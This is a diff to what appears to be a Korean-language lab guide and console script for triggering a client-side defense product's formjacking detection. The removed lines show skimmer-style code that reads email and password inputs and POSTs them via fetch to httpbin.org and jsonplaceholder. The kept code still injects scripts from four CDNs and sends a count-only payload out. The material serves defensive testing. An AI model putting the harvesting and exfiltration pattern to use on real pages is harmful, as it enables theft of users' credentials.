@@ -50,7 +50,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -61,12 +61,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -86,19 +85,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -128,7 +128,7 @@ var _poll = _si(function() {
 브라우저 자동화 도구가 없는 운영자는 수동으로 단계를 수행합니다:
 
 1. **탐색** — 보호된 애플리케이션 로그인 페이지로 이동합니다: `http://xF5XC_DOMAINNAMEx/#/login`
-2. **더미 자격 증명 입력** — 이메일 필드에 `test@example.com`을 입력하고 비밀번호 필드에 `P@ssword123`을 입력합니다(폼을 제출하지 마십시오)
+2. **더미 자격 증명 입력** — 이메일 필드에 `test@example.com`을 입력하고 비밀번호 필드에 `<DEMO_PASSWORD>`을 입력합니다(폼을 제출하지 마십시오)
 3. **DevTools 열기** — **F12**를 누르고 **콘솔** 탭으로 전환합니다
 4. **Combined Detection Script 실행** — [트리거 탐지 &mdash; Combined Simulation Script 실행](/csd/ko/trigger-detection/#run-the-combined-simulation-script)의 스크립트를 콘솔에 붙여넣고 Enter를 누릅니다
 5. **콘솔 출력 확인** — `[CSD Demo]` 단계별 출력이 필드 수집, 4개 CDN 도메인에서의 스크립트 주입, 2개 엔드포인트로의 데이터 유출을 보여주는지 확인합니다
@@ -139,7 +139,7 @@ var _poll = _si(function() {
 | --- | --- | --- |
 | 폼 필드 수집 | 이메일 및 비밀번호 입력 값을 읽음 | 민감한 폼 필드를 읽는 스크립트 — 높은 위험으로 플래그 |
 | 스크립트 주입 | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io`에서 4개의 `&lt;script&gt;` 태그를 주입 | 최대 4개의 새로운 서드파티 스크립트 도메인 탐지(CDN 가용성에 따라 다름) |
-| 데이터 유출 | `fetch`를 통해 수집된 데이터를 `www.httpbin.org` 및 `jsonplaceholder.typicode.com`으로 전송 | 외부 도메인으로의 네트워크 호출 |
+| 합성 네트워크 신호 | `fetch`로 필드 수와 폐기 표시를 전송하며 필드 값은 페이로드에 포함하지 않음 | 외부 도메인으로의 네트워크 호출 |
 
 <Aside type="note">
 **CDN 가용성은 달라질 수 있습니다.** 모든 실행에서 4개의 CDN 스크립트가 모두 로드되지는 않습니다 — 브라우저 리소스 제한, 네트워크 조건, 또는 CDN 제한으로 인해 일부가 `ERR_INSUFFICIENT_RESOURCES` 또는 타임아웃으로 실패할 수 있습니다. **어느** CDN 스크립트든 로드되면 시뮬레이션은 성공합니다. CSD는 스크립트가 성공적으로 로드되는지 여부와 관계없이 주입 시도를 탐지합니다 — `&lt;script&gt;` 태그 생성 자체가 탐지 신호입니다.
